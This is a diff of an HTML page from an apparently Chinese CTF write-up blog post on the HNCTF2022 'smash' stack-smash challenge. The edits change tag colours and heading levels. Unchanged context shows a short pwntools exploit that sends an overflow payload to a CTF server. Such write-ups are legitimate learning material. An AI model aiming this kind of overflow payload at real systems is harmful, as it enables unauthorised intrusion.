@@ -223,12 +223,12 @@
       
       <span class="tag">
         
-        <a href="/tags/PWN/" style="color: #03a9f4; margin-right: 0.5rem;">PWN</a>
+        <a href="/tags/PWN/" style="color: #00bcd4; margin-right: 0.5rem;">PWN</a>
       </span>
       
       <span class="tag">
         
-        <a href="/tags/HNCTF/" style="color: #00a596; margin-right: 0.5rem;">HNCTF</a>
+        <a href="/tags/HNCTF/" style="color: #ff7d73; margin-right: 0.5rem;">HNCTF</a>
       </span>
       
     </span>
@@ -262,7 +262,7 @@
 <p><img src="/images/%5BHNCTF2022WEEK3%5Dsmash%E5%A4%8D%E7%8E%B0/5.png"></p>
 <h2 id="exp如下"><span id="exp如下">exp如下：</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#p = process(’./pwn’)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">28378</span>)</span><br><span class="line"> </span><br><span class="line">elf = ELF(<span class="string">&#x27;./111&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">buf_addr = <span class="number">0x404060</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1f8</span> + p64(buf_addr)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Good Luck.\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="总结"><span id="总结">总结：</span></h2><p>这题感觉稍微了解了 Stack smash 这种花式栈溢出的方法，这题理解起来比较友好，其他的题像网鼎杯那道相同的方法的不太好理解，总之就是自己知识储备不够，加油，卷起来，冲冲冲！！！</p>
+<h1 id="总结"><span id="总结">总结：</span></h1><p>这题感觉稍微了解了 Stack smash 这种花式栈溢出的方法，这题理解起来比较友好，其他的题像网鼎杯那道相同的方法的不太好理解，总之就是自己知识储备不够，加油，卷起来，冲冲冲！！！</p>
 
         </div>
       
@@ -350,7 +350,7 @@
           <div class="toc-header">
             <i class="fa-solid fa-list-ul"></i> 目录
           </div>
-          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#smash"><span class="toc-number">1.</span> <span class="toc-text">smash</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#stack-smash"><span class="toc-number">1.1.</span> <span class="toc-text">Stack smash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp%E5%A6%82%E4%B8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">exp如下：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.</span> <span class="toc-text">总结：</span></a></li></ol></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#smash"><span class="toc-number">1.</span> <span class="toc-text">smash</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#stack-smash"><span class="toc-number">1.1.</span> <span class="toc-text">Stack smash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp%E5%A6%82%E4%B8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">exp如下：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结：</span></a></li></ol>
         </div>
       </div>
     </div>
